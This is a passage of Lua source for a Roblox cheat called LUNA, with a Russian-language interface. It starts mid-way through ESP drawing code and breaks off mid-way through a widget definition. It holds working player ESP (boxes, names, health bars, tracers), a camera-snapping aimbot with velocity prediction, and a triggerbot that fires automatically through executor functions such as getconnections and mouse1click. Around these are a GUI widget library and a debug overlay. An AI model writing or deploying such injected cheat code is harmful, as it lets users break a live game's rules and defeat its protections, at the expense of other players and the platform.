                local tp = cam:WorldToViewportPoint((head and head.Position or hrp.Position) + Vector3.new(0, 1.6, 0))
                local bp = cam:WorldToViewportPoint(hrp.Position - Vector3.new(0, 3.2, 0))
                local h = math.abs(bp.Y - tp.Y); local w = h * 0.55
                local x, y = sp.X - w / 2, tp.Y
                o.box.Visible = State.esp_boxes
                o.box.Position = UDim2.fromOffset(x, y); o.box.Size = UDim2.fromOffset(w, h)
                o.name.Visible = State.esp_names
                o.name.Text = plr.DisplayName; o.name.Position = UDim2.fromOffset(sp.X - 70, y - 16)
                local d = math.floor((hrp.Position - cam.CFrame.Position).Magnitude)
                o.dist.Visible = State.esp_dist
                o.dist.Text = d .. "m"; o.dist.Position = UDim2.fromOffset(sp.X - 70, y + h + 2)
                o.hpbg.Visible = State.esp_health
                o.hpbg.Position = UDim2.fromOffset(x - 6, y); o.hpbg.Size = UDim2.fromOffset(3, h)
                local pct = math.clamp(hum.Health / hum.MaxHealth, 0, 1)
                o.hpfill.Size = UDim2.fromScale(1, pct)
                o.hpfill.BackgroundColor3 = Color3.fromRGB(255, 80, 80):Lerp(Color3.fromRGB(80, 255, 120), pct)
                if State.esp_tracers then
                    o.tracer.Visible = true
                    local ox, oy = cam.ViewportSize.X / 2, cam.ViewportSize.Y
                    local tx, ty = sp.X, y + h
                    local dx, dy = tx - ox, ty - oy
                    local len = math.sqrt(dx * dx + dy * dy)
                    o.tracer.Position = UDim2.fromOffset((ox + tx) / 2, (oy + ty) / 2)
                    o.tracer.Size = UDim2.fromOffset(len, 1)
                    o.tracer.Rotation = math.deg(math.atan2(dy, dx))
                else o.tracer.Visible = false end
            else
                o.box.Visible = false; o.name.Visible = false; o.dist.Visible = false; o.hpbg.Visible = false; o.tracer.Visible = false
            end
        else
            o.box.Visible = false; o.name.Visible = false; o.dist.Visible = false; o.hpbg.Visible = false; o.tracer.Visible = false
        end
    end
end))

----------------------------------------------------------------------
-- FEATURES: AIMBOT / TRIGGERBOT
----------------------------------------------------------------------
State.aim_fov, State.aim_smooth = 140, 30
State.aim_mode, State.aim_part, State.aim_pred = "Зажатие", "Голова", 0
State.aim_team, State.aim_wall, State.aim_sticky, State.aim_fovcircle = false, false, false, true
State.aim_maxdist = 1000
State.trigger_delay, State.trig_mode, State.trig_team, State.trig_maxdist = 50, "Зажатие", false, 1000
State.trig_hitbox = true

local aimKeyBind = Enum.UserInputType.MouseButton2
local trigKeyBind = Enum.KeyCode.E
local aimHeld, aimToggle, trigHeld = false, false, false

local FOV_COLORS = { ["Фиолетовый"] = C.acc, ["Белый"] = Color3.new(1, 1, 1), ["Красный"] = C.red, ["Зелёный"] = C.green, ["Голубой"] = C.cyan }
local FovCircle = new("Frame", { AnchorPoint = Vector2.new(0.5, 0.5), Size = UDim2.fromOffset(240, 240),
    BackgroundTransparency = 1, BorderSizePixel = 0, Visible = false, Parent = GUI })
new("UICorner", { CornerRadius = UDim.new(1, 0), Parent = FovCircle })
local FovStroke = stroke(FovCircle, C.acc, 1.5, 0.2)

-- shared debug data (filled by aim/trigger every frame)
local Dbg = {
    aim_active = false, aim_target = "—", aim_part = "—", aim_dist = 0, aim_sd = 0, aim_vis = "—",
    trig_active = false, trig_hit = "—", trig_player = "—", trig_dist = 0, trig_canfire = false,
    trig_method = "—", trig_shots = 0,
}

UIS.InputBegan:Connect(function(i)
    if bindMatches(aimKeyBind, i) then aimHeld = true; if State.aim_mode == "Переключение" then aimToggle = not aimToggle end end
    if bindMatches(trigKeyBind, i) then trigHeld = true end
end)
UIS.InputEnded:Connect(function(i)
    if bindMatches(aimKeyBind, i) then aimHeld = false end
    if bindMatches(trigKeyBind, i) then trigHeld = false end
end)

local function equippedTool()
    local char = LP.Character
    return char and char:FindFirstChildOfClass("Tool")
end

-- Directly invoke whatever handlers are bound to a signal (executor feature).
local function fireSignal(signal)
    if not EX.getconnections or not signal then return false end
    local ok, conns = pcall(EX.getconnections, signal)
    if not ok or not conns then return false end
    local any = false
    for _, c in ipairs(conns) do
        pcall(function()
            if c.Enabled == false and c.Enable then c:Enable() end
            local f = c.Fire or c.fire
            if f then f(c); any = true end
        end)
    end
    return any
end

local function fireMethod()
    if EX.mouse1click then return "mouse1click" end
    if EX.mouse1press and EX.mouse1release then return "mouse1press" end
    if EX.getconnections then return "getconnections" end
    if equippedTool() then return "tool" end
    return "нет"
end

local function fireClick()
    Dbg.trig_shots = (Dbg.trig_shots or 0) + 1
    local tool = equippedTool()
    -- 1) activate the tool (Tool.Activated based weapons)
    if tool then pcall(function() tool:Activate() end) end
    -- 2) trigger handlers bound to mouse / tool (works when the gun uses its own listeners)
    local mouse = LP:GetMouse()
    fireSignal(mouse.Button1Down)
    if tool then fireSignal(tool.Activated) end
    task.delay(0.03, function() pcall(function() fireSignal(mouse.Button1Up) end) end)
    -- 3) raw synthetic click (executor)
    if EX.mouse1click then
        pcall(EX.mouse1click)
    elseif EX.mouse1press and EX.mouse1release then
        pcall(function() EX.mouse1press(); task.wait(0.02); EX.mouse1release() end)
    end
end

local function getAimPart(char)
    local map = { ["Голова"] = "Head", ["Грудь"] = "UpperTorso", ["Корпус"] = "HumanoidRootPart" }
    local name = map[State.aim_part] or "Head"
    return char:FindFirstChild(name) or char:FindFirstChild("Torso") or char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Head")
end

local function isVisible(part)
    local cam = Cam()
    local params = RaycastParams.new(); params.FilterType = Enum.RaycastFilterType.Exclude
    params.FilterDescendantsInstances = { LP.Character, part.Parent }
    local res = workspace:Raycast(cam.CFrame.Position, part.Position - cam.CFrame.Position, params)
    return res == nil
end

local function canFire()
    if EX.mouse1click then return true end
    if EX.mouse1press and EX.mouse1release then return true end
    if EX.getconnections then return true end
    if equippedTool() then return true end
    return false
end

local function evalTarget(plr)
    if plr == LP then return end
    local char = plr.Character; if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid"); if not hum or hum.Health <= 0 then return end
    if State.aim_team and plr.Team and LP.Team and plr.Team == LP.Team then return end
    local part = getAimPart(char); if not part then return end
    local cam = Cam()
    local sp, on = cam:WorldToViewportPoint(part.Position); if not on then return end
    if (part.Position - cam.CFrame.Position).Magnitude > State.aim_maxdist then return end
    local sd = (Vector2.new(sp.X, sp.Y) - Vector2.new(cam.ViewportSize.X, cam.ViewportSize.Y) / 2).Magnitude
    if sd > State.aim_fov then return end
    if State.aim_wall and not isVisible(part) then return end
    return part, sd
end

local currentTarget
local function pickTarget()
    if State.aim_sticky and currentTarget then
        local part = evalTarget(currentTarget); if part then return part, currentTarget end
    end
    local bestPart, bestD, bestPlr = nil, math.huge, nil
    for _, plr in ipairs(Players:GetPlayers()) do
        local part, sd = evalTarget(plr)
        if part and sd < bestD then bestPart, bestD, bestPlr = part, sd, plr end
    end
    currentTarget = bestPlr
    return bestPart, bestPlr
end

local function aimActive()
    if not State.aimbot then return false end
    local m = State.aim_mode
    if m == "Всегда" then return true end
    if m == "Переключение" then return aimToggle end
    return aimHeld
end

-- FOV circle (runs in normal RenderStepped, purely cosmetic)
RunService.RenderStepped:Connect(guard(function()
    local cam = Cam()
    FovCircle.Visible = State.aimbot and State.aim_fovcircle
    if FovCircle.Visible then
        FovCircle.Size = UDim2.fromOffset(State.aim_fov * 2, State.aim_fov * 2)
        local inset = GUI.IgnoreGuiInset and 36 or 0
        FovCircle.Position = UDim2.fromOffset(cam.ViewportSize.X / 2, cam.ViewportSize.Y / 2 + inset)
    end
end))

-- AIM: must run AFTER the default camera updates, otherwise our CFrame is overwritten.
RunService:BindToRenderStep("LunaAim", Enum.RenderPriority.Camera.Value + 2, guard(function()
    local active = aimActive()
    Dbg.aim_active = active
    if not active then currentTarget = nil; Dbg.aim_target = "—"; Dbg.aim_part = "—"; return end
    local part, plr = pickTarget()
    if part and plr then
        local cam = Cam()
        Dbg.aim_target = plr.Name
        Dbg.aim_part = part.Name
        Dbg.aim_dist = math.floor((part.Position - cam.CFrame.Position).Magnitude)
        local sp = cam:WorldToViewportPoint(part.Position)
        Dbg.aim_sd = math.floor((Vector2.new(sp.X, sp.Y) - Vector2.new(cam.ViewportSize.X, cam.ViewportSize.Y) / 2).Magnitude)
        Dbg.aim_vis = isVisible(part) and "да" or "нет"
        local aimPos = part.Position + part.AssemblyLinearVelocity * (State.aim_pred / 100)
        local goal = CFrame.lookAt(cam.CFrame.Position, aimPos)
        cam.CFrame = cam.CFrame:Lerp(goal, math.clamp(1 - State.aim_smooth / 100, 0.03, 1))
    else
        Dbg.aim_target = "нет цели"; Dbg.aim_part = "—"
    end
end))

local isOpen = false

local function trigActive()
    if isOpen then return false end
    if not State.trigger then return false end
    if State.trig_mode == "Всегда" then return true end
    return trigHeld
end

-- common hitbox/limb names used by games (crit, arm, leg, ...)
local HITBOX_NAMES = { "crit", "arm", "leg", "head", "torso", "body", "hitbox", "hand", "foot",
    "upperarm", "lowerarm", "upperleg", "lowerleg", "humanoidrootpart", "rootpart" }
local function isHitboxName(n)
    n = string.lower(n)
    for _, k in ipairs(HITBOX_NAMES) do if string.find(n, k, 1, true) then return true end end
    return false
end
-- returns Player, "npc" (enemy humanoid w/o player), or nil
local function resolveEnemy(inst)
    local node = inst
    for _ = 1, 10 do
        if not node or node == workspace then break end
        if node:IsA("Model") then
            local plr = Players:GetPlayerFromCharacter(node)
            if plr and plr ~= LP then return plr end
            local hum = node:FindFirstChildOfClass("Humanoid")
            if hum and node ~= LP.Character then return "npc" end
        end
        node = node.Parent
    end
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP and plr.Character and inst:IsDescendantOf(plr.Character) then return plr end
    end
    return nil
end

local triggerReady = true
RunService.Heartbeat:Connect(guard(function()
    Dbg.trig_active = trigActive()
    Dbg.trig_canfire = canFire()
    Dbg.trig_method = fireMethod()
    if not trigActive() then Dbg.trig_hit = "—"; Dbg.trig_player = "—"; return end
    local cam = Cam()
    local ray = cam:ViewportPointToRay(cam.ViewportSize.X / 2, cam.ViewportSize.Y / 2)
    local params = RaycastParams.new(); params.FilterType = Enum.RaycastFilterType.Exclude
    params.FilterDescendantsInstances = { LP.Character }
    local res = workspace:Raycast(ray.Origin, ray.Direction * State.trig_maxdist, params)
    if not res or not res.Instance then Dbg.trig_hit = "—"; Dbg.trig_player = "—"; return end

    local hit = res.Instance
    Dbg.trig_hit = hit.Name
    Dbg.trig_dist = math.floor((res.Position - cam.CFrame.Position).Magnitude)

    local enemy = resolveEnemy(hit)                       -- Player / "npc" / nil
    local nameHit = State.trig_hitbox and isHitboxName(hit.Name)
    local isPlayer = (typeof(enemy) == "Instance")
    local valid = (enemy ~= nil) or nameHit

    Dbg.trig_player = isPlayer and enemy.Name or (enemy == "npc" and "NPC") or (nameHit and ("хитбокс:" .. hit.Name)) or "—"

    if valid and triggerReady then
        if isPlayer and State.trig_team and enemy.Team and LP.Team and enemy.Team == LP.Team then return end
        triggerReady = false
        task.delay(State.trigger_delay / 1000, function()
            if Luna_Unloaded or isOpen then triggerReady = true; return end
            fireClick(); task.wait(0.08); triggerReady = true
        end)
    end
end))

----------------------------------------------------------------------
-- DEBUG OVERLAY (live aim/trigger data)
----------------------------------------------------------------------
local DebugWin = new("Frame", { Size = UDim2.fromOffset(248, 252), Position = UDim2.fromOffset(20, 90),
    BackgroundColor3 = C.card, BorderSizePixel = 0, Visible = false, Parent = GUI })
corner(DebugWin, 10); stroke(DebugWin, C.acc, 1, 0.4)
local dbgHead = new("Frame", { Size = UDim2.new(1, 0, 0, 28), BackgroundColor3 = C.elem, BorderSizePixel = 0, Parent = DebugWin })
corner(dbgHead, 10)
new("Frame", { Size = UDim2.new(1, 0, 0, 12), Position = UDim2.new(0, 0, 1, -12), BackgroundColor3 = C.elem, BorderSizePixel = 0, Parent = dbgHead })
new("TextLabel", { Size = UDim2.new(1, -16, 1, 0), Position = UDim2.fromOffset(12, 0), BackgroundTransparency = 1,
    Text = "ОТЛАДКА", TextColor3 = C.acc, TextSize = 12, Font = FONTB, TextXAlignment = Enum.TextXAlignment.Left, Parent = dbgHead })
local dbgBody = new("TextLabel", { Size = UDim2.new(1, -20, 1, -36), Position = UDim2.fromOffset(12, 32), BackgroundTransparency = 1,
    RichText = true, Text = "", TextColor3 = C.text, TextSize = 12, Font = FONT, TextXAlignment = Enum.TextXAlignment.Left,
    TextYAlignment = Enum.TextYAlignment.Top, Parent = DebugWin })
do
    local dragging, ds, sp
    dbgHead.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true; ds = i.Position; sp = DebugWin.Position
            i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then dragging = false end end) end
    end)
    UIS.InputChanged:Connect(function(i)
        if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
            local d = i.Position - ds; DebugWin.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y) end
    end)
end
local function gv(v) return string.format('<font color="#8a63f7">%s</font>', tostring(v)) end
local function gb(b) return b and '<font color="#56d68e">да</font>' or '<font color="#e84e5f">нет</font>' end
RunService.Heartbeat:Connect(guard(function()
    if not DebugWin.Visible then return end
    dbgBody.Text = table.concat({
        '<b>ПРИЦЕЛ</b>',
        'включён: ' .. gb(State.aimbot) .. '   активен: ' .. gb(Dbg.aim_active),
        'режим: ' .. gv(State.aim_mode) .. '  кл: ' .. gv(bindDisplay(aimKeyBind)),
        'цель: ' .. gv(Dbg.aim_target),
        'часть: ' .. gv(Dbg.aim_part) .. '   дист: ' .. gv(Dbg.aim_dist .. "м"),
        'от центра: ' .. gv(Dbg.aim_sd .. "/" .. math.floor(State.aim_fov) .. "px"),
        'видим: ' .. gv(Dbg.aim_vis),
        '',
        '<b>ТРИГГЕР</b>',
        'включён: ' .. gb(State.trigger) .. '   активен: ' .. gb(Dbg.trig_active),
        'луч в: ' .. gv(Dbg.trig_hit),
        'игрок: ' .. gv(Dbg.trig_player) .. '  дист: ' .. gv(Dbg.trig_dist .. "м"),
        'метод: ' .. gv(Dbg.trig_method) .. '   выстрелов: ' .. gv(Dbg.trig_shots),
    }, "\n")
end))

----------------------------------------------------------------------
-- SIDEBAR
----------------------------------------------------------------------
local Sidebar = new("Frame", { Size = UDim2.new(0, 188, 1, 0), BackgroundColor3 = C.side, BorderSizePixel = 0, Parent = Win })
corner(Sidebar, 14)
new("Frame", { Size = UDim2.new(0, 14, 1, 0), Position = UDim2.new(1, -14, 0, 0), BackgroundColor3 = C.side, BorderSizePixel = 0, Parent = Sidebar })

local Logo = new("Frame", { Size = UDim2.new(1, 0, 0, 70), BackgroundTransparency = 1, Parent = Sidebar })
local logoBox = new("Frame", { Size = UDim2.fromOffset(34, 34), Position = UDim2.fromOffset(20, 18),
    BackgroundColor3 = C.elem, BorderSizePixel = 0, Parent = Logo })
corner(logoBox, 9)
do -- crescent moon drawn from two circles
    icircle(logoBox, 17, 17, 18, 0, C.acc, true)
    icircle(logoBox, 22, 14, 16, 0, C.elem, true)
end
new("TextLabel", { Size = UDim2.fromOffset(110, 20), Position = UDim2.fromOffset(64, 18), BackgroundTransparency = 1,
    Text = "LUNA", TextColor3 = C.text, TextSize = 19, Font = FONTB, TextXAlignment = Enum.TextXAlignment.Left, Parent = Logo })
new("TextLabel", { Size = UDim2.fromOffset(110, 14), Position = UDim2.fromOffset(64, 38), BackgroundTransparency = 1,
    Text = "ROBLOX CHEAT", TextColor3 = C.dim, TextSize = 10, Font = FONT, TextXAlignment = Enum.TextXAlignment.Left, Parent = Logo })

local NavHolder = new("Frame", { Size = UDim2.new(1, 0, 1, -86), Position = UDim2.fromOffset(0, 80),
    BackgroundTransparency = 1, Parent = Sidebar })
new("UIListLayout", { Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder, Parent = NavHolder })
pad(NavHolder, 12, 0, 12, 0)

----------------------------------------------------------------------
-- CONTENT AREA
----------------------------------------------------------------------
local ContentWrap = new("Frame", { Size = UDim2.new(1, -188, 1, 0), Position = UDim2.fromOffset(188, 0), BackgroundTransparency = 1, Parent = Win })
local Header = new("Frame", { Size = UDim2.new(1, 0, 0, 58), BackgroundTransparency = 1, Parent = ContentWrap })
local Title = new("TextLabel", { Size = UDim2.fromOffset(400, 28), Position = UDim2.fromOffset(24, 18), BackgroundTransparency = 1,
    Text = "Главная", TextColor3 = C.text, TextSize = 22, Font = FONTB, TextXAlignment = Enum.TextXAlignment.Left, Parent = Header })
local CloseBtn = new("TextButton", { Size = UDim2.fromOffset(30, 30), Position = UDim2.new(1, -42, 0, 16),
    BackgroundColor3 = C.elem, Text = "", AutoButtonColor = false, BorderSizePixel = 0, Parent = Header })
corner(CloseBtn, 8)
local closeIcon = Icon(CloseBtn, "x", C.sub, 18); closeIcon.Position = UDim2.fromOffset(6, 6)
CloseBtn.MouseEnter:Connect(function() tw(CloseBtn, QUICK, { BackgroundColor3 = C.red }):Play(); recolorIcon(closeIcon, C.text) end)
CloseBtn.MouseLeave:Connect(function() tw(CloseBtn, QUICK, { BackgroundColor3 = C.elem }):Play(); recolorIcon(closeIcon, C.sub) end)

local Pages = new("Frame", { Size = UDim2.new(1, 0, 1, -58), Position = UDim2.fromOffset(0, 58), BackgroundTransparency = 1, Parent = ContentWrap })

----------------------------------------------------------------------
-- WIDGET LIBRARY
----------------------------------------------------------------------
local Widgets = {}

function Widgets.Card(parent, titleText)
    local card = new("Frame", { Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
        BackgroundColor3 = C.card, BorderSizePixel = 0, Parent = parent })
    corner(card, 10); stroke(card, C.border, 1, 0.6); pad(card, 16, 14, 16, 14)
    new("UIListLayout", { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder, Parent = card })
    if titleText then
        new("TextLabel", { Size = UDim2.new(1, 0, 0, 20), BackgroundTransparency = 1, Text = titleText, TextColor3 = C.text,
            TextSize = 15, Font = FONTB, TextXAlignment = Enum.TextXAlignment.Left, LayoutOrder = -1, Parent = card })
    end
    return card
end

function Widgets.Toggle(parent, text, default, cb, flag)
    local on = default or false
    local row = new("Frame", { Size = UDim2.new(1, 0, 0, 30), BackgroundTransparency = 1, Parent = parent })
    new("TextLabel", { Size = UDim2.new(1, -54, 1, 0), BackgroundTransparency = 1, Text = text, TextColor3 = C.text,
        TextSize = 13, Font = FONT, TextXAlignment = Enum.TextXAlignment.Left, Parent = row })
    local sw = new("Frame", { Size = UDim2.fromOffset(40, 21), Position = UDim2.new(1, -40, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5),
        BackgroundColor3 = on and C.acc or C.track, BorderSizePixel = 0, Parent = row })
    corner(sw, 11)
    local knob = new("Frame", { Size = UDim2.fromOffset(15, 15), AnchorPoint = Vector2.new(0, 0.5),
        Position = on and UDim2.new(1, -18, 0.5, 0) or UDim2.new(0, 3, 0.5, 0), BackgroundColor3 = Color3.new(1,1,1), BorderSizePixel = 0, Parent = sw })
    corner(knob, 8)
    local function set(v, silent)
        on = v
        tw(sw, QUICK, { BackgroundColor3 = on and C.acc or C.track }):Play()
        tw(knob, QUICK, { Position = on and UDim2.new(1, -18, 0.5, 0) or UDim2.new(0, 3, 0.5, 0) }):Play()
        if flag then State[flag] = on end
        if cb and not silent then cb(on) end
    end
    if flag then State[flag] = on; Setters[flag] = function(v) set(v, true); if cb then cb(v) end end end
    new("TextButton", { Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Text = "", Parent = row }).MouseButton1Click:Connect(function() set(not on) end)
    return { Set = set }
end

local activeSlider
UIS.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then activeSlider = nil end end)
UIS.InputChanged:Connect(function(i) if activeSlider and i.UserInputType == Enum.UserInputType.MouseMovement then activeSlider(i.Position.X) end end)

function Widgets.Slider(parent, text, min, max, default, cb, flag)
    local val = default or min
    local row = new("Frame", { Size = UDim2.new(1, 0, 0, 40), BackgroundTransparency = 1, Parent = parent })
    new("TextLabel", { Size = UDim2.new(1, -60, 0, 16), BackgroundTransparency = 1, Text = text, TextColor3 = C.sub,
        TextSize = 13, Font = FONT, TextXAlignment = Enum.TextXAlignment.Left, Parent = row })
    local valLbl = new("TextLabel", { Size = UDim2.fromOffset(60, 16), Position = UDim2.new(1, -60, 0, 0), BackgroundTransparency = 1,
        Text = tostring(val), TextColor3 = C.acc, TextSize = 13, Font = FONTB, TextXAlignment = Enum.TextXAlignment.Right, Parent = row })
    local track = new("Frame", { Size = UDim2.new(1, 0, 0, 6), Position = UDim2.fromOffset(0, 26), BackgroundColor3 = C.track, BorderSizePixel = 0, Parent = row })
    corner(track, 3)
    local fill = new("Frame", { Size = UDim2.fromScale((val - min) / (max - min), 1), BackgroundColor3 = C.acc, BorderSizePixel = 0, Parent = track })
    corner(fill, 3); gradient(fill, C.accDim, C.acc, 0)
    new("Frame", { Size = UDim2.fromOffset(13, 13), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(1, 0, 0.5, 0),
        BackgroundColor3 = Color3.new(1,1,1), BorderSizePixel = 0, Parent = fill }, { (function() local u=Instance.new("UICorner"); u.CornerRadius=UDim.new(0,7); return u end)() })
    local function update(mouseX)
        local rel = math.clamp((mouseX - track.AbsolutePosition.X) / track.AbsoluteSize.X, 0, 1)
        val = math.floor(min + (max - min) * rel + 0.5)
        fill.Size = UDim2.fromScale(rel, 1); valLbl.Text = tostring(val)
        if flag then State[flag] = val end
        if cb then cb(val) end
    end
    if flag then State[flag] = val; Setters[flag] = function(v)
        local rel = (v - min) / (max - min); fill.Size = UDim2.fromScale(rel, 1); val = v; valLbl.Text = tostring(v)
        State[flag] = v; if cb then cb(v) end end
    end
    new("TextButton", { Size = UDim2.new(1, 0, 0, 22), Position = UDim2.fromOffset(0, 18), BackgroundTransparency = 1, Text = "", Parent = row })
        .MouseButton1Down:Connect(function(x) activeSlider = update; update(x) end)
    return row
end

function Widgets.Dropdown(parent, text, options, default, cb, flag)
    local row = new("Frame", { Size = UDim2.new(1, 0, 0, 44), BackgroundTransparency = 1, ClipsDescendants = false, Parent = parent })
    new("TextLabel", { Size = UDim2.new(1, 0, 0, 16), BackgroundTransparency = 1, Text = text, TextColor3 = C.sub,
        TextSize = 13, Font = FONT, TextXAlignment = Enum.TextXAlignment.Left, Parent = row })
    local box = new("TextButton", { Size = UDim2.new(1, 0, 0, 26), Position = UDim2.fromOffset(0, 18), BackgroundColor3 = C.elem,
        Text = "", AutoButtonColor = false, BorderSizePixel = 0, Parent = row })
    corner(box, 7); stroke(box, C.border, 1, 0.5)
    local sel = new("TextLabel", { Size = UDim2.new(1, -34, 1, 0), Position = UDim2.fromOffset(10, 0), BackgroundTransparency = 1,
        Text = default or options[1], TextColor3 = C.text, TextSize = 13, Font = FONT, TextXAlignment = Enum.TextXAlignment.Left, Parent = box })
    local arrow = Icon(box, "chevron", C.sub, 18); arrow.Position = UDim2.new(1, -24, 0.5, -9); arrow.AnchorPoint = Vector2.new(0, 0)
    local listFrame = new("Frame", { Size = UDim2.new(1, 0, 0, 0), Position = UDim2.fromOffset(0, 48), BackgroundColor3 = C.elem,
        BorderSizePixel = 0, ClipsDescendants = true, Visible = false, ZIndex = 10, Parent = row })
    corner(listFrame, 7); stroke(listFrame, C.border, 1, 0.5)
    new("UIListLayout", { Parent = listFrame })
    local open = false
    if flag then State[flag] = default or options[1] end
    for _, opt in ipairs(options) do
        local ob = new("TextButton", { Size = UDim2.new(1, 0, 0, 26), BackgroundColor3 = C.elem, AutoButtonColor = false,
            Text = opt, TextColor3 = C.sub, TextSize = 13, Font = FONT, ZIndex = 11, BorderSizePixel = 0, Parent = listFrame })
        ob.MouseEnter:Connect(function() tw(ob, QUICK, { BackgroundColor3 = C.elemH, TextColor3 = C.text }):Play() end)
        ob.MouseLeave:Connect(function() tw(ob, QUICK, { BackgroundColor3 = C.elem, TextColor3 = C.sub }):Play() end)
        ob.MouseButton1Click:Connect(function()
            sel.Text = opt; open = false; listFrame.Visible = false; listFrame.Size = UDim2.new(1, 0, 0, 0)
            row.Size = UDim2.new(1, 0, 0, 44)
            if flag then State[flag] = opt end
            if cb then cb(opt) end
        end)
    end
    if flag then Setters[flag] = function(v) sel.Text = v; State[flag] = v; if cb then cb(v) end end end
    box.MouseButton1Click:Connect(function()
        open = not open
        if open then
            local h = #options * 26; listFrame.Visible = true; row.Size = UDim2.new(1, 0, 0, 48 + h)
            tw(listFrame, QUICK, { Size = UDim2.new(1, 0, 0, h) }):Play()
        else
            row.Size = UDim2.new(1, 0, 0, 44); listFrame.Visible = false; listFrame.Size = UDim2.new(1, 0, 0, 0)
        end
    end)
    return row
end

function Widgets.Button(parent, text, primary, cb)
    local btn = new("TextButton", { Size = UDim2.new(1, 0, 0, 32), BackgroundColor3 = primary and C.acc or C.elem, Text = text,
        TextColor3 = primary and C.text or C.sub, TextSize = 13, Font = FONTB, AutoButtonColor = false, BorderSizePixel = 0, Parent = parent })
    corner(btn, 7)
    if not primary then stroke(btn, C.border, 1, 0.5) end
    btn.MouseEnter:Connect(function() tw(btn, QUICK, { BackgroundColor3 = primary and C.accDim or C.elemH, TextColor3 = C.text }):Play() end)
    btn.MouseLeave:Connect(function() tw(btn, QUICK, { BackgroundColor3 = primary and C.acc or C.elem, TextColor3 = primary and C.text or C.sub }):Play() end)
    btn.MouseButton1Click:Connect(function() if cb then cb() end end)
    return btn
end

function Widgets.Info(parent, key, value, valColor)
    local row = new("Frame", { Size = UDim2.new(1, 0, 0, 24), BackgroundTransparency = 1, Parent = parent })
    new("TextLabel", { Size = UDim2.new(0.5, 0, 1, 0), BackgroundTransparency = 1, Text = key, TextColor3 = C.sub,
        TextSize = 13, Font = FONT, TextXAlignment = Enum.TextXAlignment.Left, Parent = row })
    local v = new("TextLabel", { Size = UDim2.new(0.5, 0, 1, 0), Position = UDim2.fromScale(0.5, 0), BackgroundTransparency = 1,
        Text = value, TextColor3 = valColor or C.text, TextSize = 13, Font = FONTB, TextXAlignment = Enum.TextXAlignment.Right, Parent = row })
    return row, v
end

function Widgets.Keybind(parent, text, default, cb, flag)
    local bind = resolveBind(default) or default
    local row = new("Frame", { Size = UDim2.new(1, 0, 0, 30), BackgroundTransparency = 1, Parent = parent })
    new("TextLabel", { Size = UDim2.new(1, -84, 1, 0), BackgroundTransparency = 1, Text = text, TextColor3 = C.text,
        TextSize = 13, Font = FONT, TextXAlignment = Enum.TextXAlignment.Left, Parent = row })
    local btn = new("TextButton", { Size = UDim2.fromOffset(74, 22), Position = UDim2.new(1, -74, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5),
        BackgroundColor3 = C.elem, Text = bindDisplay(bind), TextColor3 = C.sub, TextSize = 12, Font = FONTB,
        AutoButtonColor = false, BorderSizePixel = 0, Parent = row })
    corner(btn, 6); stroke(btn, C.border, 1, 0.5)
    local listening = false
    local function apply(b, silent)
        bind = b; btn.Text = bindDisplay(bind); btn.TextColor3 = C.sub
        if flag then State[flag] = (typeof(b) == "EnumItem" and b.Name or nil) end
        if cb and not silent then cb(bind) end
    end
    if flag then State[flag] = (typeof(bind) == "EnumItem" and bind.Name or nil)
        Setters[flag] = function(v) local rb = resolveBind(v); if rb then apply(rb, true); if cb then cb(rb) end end end
    end
    btn.MouseButton1Click:Connect(function() listening = true; btn.Text = "..."; btn.TextColor3 = C.acc end)
    UIS.InputBegan:Connect(function(i)
        if not listening then return end
        if i.KeyCode == Enum.KeyCode.Escape then listening = false; apply(nil); return end
        local b
        if i.UserInputType == Enum.UserInputType.Keyboard and i.KeyCode ~= Enum.KeyCode.Unknown then b = i.KeyCode
        elseif MOUSE_NAMES[i.UserInputType] then b = i.UserInputType end
        if b then listening = false; apply(b) end
    end)
    if cb then cb(bind) end
    return { Set = apply }
end

----------------------------------------------------------------------
-- TOOLTIP + EXECUTOR NAME + DISABLED CONTROL
----------------------------------------------------------------------
local function execName()
    local ok, n = pcall(function() return identifyexecutor and identifyexecutor() end)
    if ok and type(n) == "string" and n ~= "" then return n end
    ok, n = pcall(function() return getexecutorname and getexecutorname() end)
    if ok and type(n) == "string" and n ~= "" then return n end
    return "вашем инжекторе"
end
local EXEC = execName()

local Tooltip = new("Frame", { BackgroundColor3 = C.elem, BorderSizePixel = 0, Visible = false,
    AutomaticSize = Enum.AutomaticSize.XY, ZIndex = 200, Parent = GUI })
corner(Tooltip, 6); stroke(Tooltip, C.acc, 1, 0.3)
pad(Tooltip, 8, 5, 8, 5)
local TooltipText = new("TextLabel", { BackgroundTransparency = 1, AutomaticSize = Enum.AutomaticSize.XY,
    Text = "", TextColor3 = C.text, TextSize = 12, Font = FONT, ZIndex = 201, Parent = Tooltip })
local function attachTooltip(obj, text)
    obj.MouseEnter:Connect(function() TooltipText.Text = text; Tooltip.Visible = true end)
    obj.MouseLeave:Connect(function() Tooltip.Visible = false end)
    obj.MouseMoved:Connect(function(x, y) Tooltip.Position = UDim2.fromOffset(x + 14, y + 8) end)
end

-- A locked/greyed-out toggle that can't be switched; shows a tooltip on hover.
function Widgets.DisabledToggle(parent, text, tip)
    local row = new("Frame", { Size = UDim2.new(1, 0, 0, 30), BackgroundTransparency = 1, Parent = parent })
    new("TextLabel", { Size = UDim2.new(1, -54, 1, 0), BackgroundTransparency = 1, Text = text, TextColor3 = C.dim,
        TextSize = 13, Font = FONT, TextXAlignment = Enum.TextXAlignment.Left, Parent = row })
    local sw = new("Frame", { Size = UDim2.fromOffset(40, 21), Position = UDim2.new(1, -40, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5),
        BackgroundColor3 = Color3.fromRGB(38, 33, 52), BorderSizePixel = 0, Parent = row })
    corner(sw, 11)
